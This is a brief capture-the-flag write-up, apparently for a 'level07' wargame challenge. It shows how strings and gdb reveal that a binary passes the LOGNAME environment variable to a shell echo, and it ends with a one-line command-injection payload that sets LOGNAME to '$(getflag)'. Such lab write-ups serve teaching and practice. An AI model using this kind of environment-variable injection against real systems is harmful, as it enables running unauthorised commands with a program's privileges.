strings on level07 show a call to echo %s.
controlling that could allow to run $(getflag)
disas of main in gdb show a call to getenv ? weird
strings again show the string LOGNAME, matching what the elf output, so simply :
```
LOGNAME='$(getflag)' ./level07
```
